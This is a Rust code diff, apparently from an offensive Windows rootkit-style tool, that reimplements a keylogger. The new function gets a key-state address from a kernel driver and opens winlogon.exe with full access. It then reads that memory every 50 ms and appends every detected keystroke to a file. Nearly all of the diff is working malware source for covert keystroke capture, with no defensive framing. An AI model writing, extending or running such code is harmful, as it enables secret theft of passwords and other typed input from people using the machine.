@@ -1,13 +1,32 @@
 use {
     log::*,
-    crate::utils::open_driver,
-    shared::structs::{Keylogger, DSE, ETWTI},
-    std::{ffi::c_void, mem::size_of, ptr::null_mut},
+    crate::utils::{
+        vk_to_char, update_key_state, key_pressed,
+        get_process_by_name, open_driver,
+    }, 
+    shared::structs::{DSE, ETWTI}, 
+    std::{
+        ffi::c_void, fs::OpenOptions, io::{BufWriter, Write}, 
+        mem::size_of, ptr::null_mut, time::Duration 
+    }, 
     windows_sys::Win32::{
-        System::IO::DeviceIoControl,
-        Foundation::{CloseHandle, GetLastError, HANDLE},
-    },
+        System::{
+            IO::DeviceIoControl,
+            Diagnostics::Debug::ReadProcessMemory, 
+            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
+        },
+        Foundation::{
+            INVALID_HANDLE_VALUE, CloseHandle, 
+            GetLastError, HANDLE,
+        },
+    }
 };
+
+
+/// Key states.
+pub static mut KEY_STATE: [u8; 64] = [0; 64];
+pub static mut KEY_PREVIOUS: [u8; 64] = [0; 64];
+pub static mut KEY_RECENT: [u8; 64] = [0; 64];
 
 pub struct Misc {
     driver_handle: HANDLE,
@@ -45,29 +64,61 @@ impl Misc {
         }
     }
 
-    pub fn keylogger(self, ioctl_code: u32, state: bool) {
-        debug!("Preparing Keylogger structure for {}", if state { "start" } else { "stop" });
-        let mut keylogger = Keylogger { enable: state };
 
-        debug!("Sending DeviceIoControl command to {} Keylogger", if state { "start" } else { "stop" });
-        let mut return_buffer = 0;
-        let status = unsafe {
-            DeviceIoControl(
+    pub fn keylogger(self, ioctl_code: u32, file: &String) {
+        unsafe {
+            let mut address: usize = 0;
+            let mut return_buffer = 0;
+            let status = DeviceIoControl(
                 self.driver_handle,
                 ioctl_code,
-                &mut keylogger as *mut _ as *mut c_void,
-                std::mem::size_of::<Keylogger>() as u32,
                 null_mut(),
                 0,
+                &mut address as *mut _ as *mut c_void,
+                size_of::<usize>() as u32,
                 &mut return_buffer,
                 null_mut(),
-            )
-        };
+            );
 
-        if status == 0 {
-            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
-        } else {
-            info!("Keylogger {}", if state { "start" } else { "stop" })
+            if status == 0 {
+                error!("DeviceIoControl Failed With Status: 0x{:08X}", GetLastError());
+                return;
+            }
+
+            let pid = get_process_by_name("winlogon.exe").expect("Error retrieving pid from winlogon.exe");
+            let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+            if h_process == INVALID_HANDLE_VALUE {
+                eprintln!("OpenProcess Failed With Error: {}", GetLastError());
+                return;
+            }
+
+            let file = OpenOptions::new()
+                .append(true)
+                .create(true)
+                .open(file)
+                .expect("Failed to open or create keylog file");
+            let mut writer = BufWriter::new(file);
+            let mut bytes_read = 0;
+
+            loop {
+                core::ptr::copy_nonoverlapping(KEY_STATE.as_ptr(), KEY_PREVIOUS.as_mut_ptr(), 64);
+                if ReadProcessMemory(h_process, address as *const c_void, KEY_STATE.as_mut_ptr() as _, size_of::<[u8; 64]>() as usize, &mut bytes_read) != 0 {
+                    update_key_state();
+
+                    for i in 0..256 {
+                        if key_pressed(i as u8) {
+                            let key = vk_to_char(i as u8);
+                            debug!("{key}");
+                            writeln!(writer, "{}", key).expect("Failed to write to file");
+                            writer.flush().expect("Failed to flush file buffer");
+                        }
+                    }
+                } else {
+                    eprintln!("Failed to read process memory");
+                }
+                    
+                std::thread::sleep(Duration::from_millis(50));
+            }
         }
     }
 
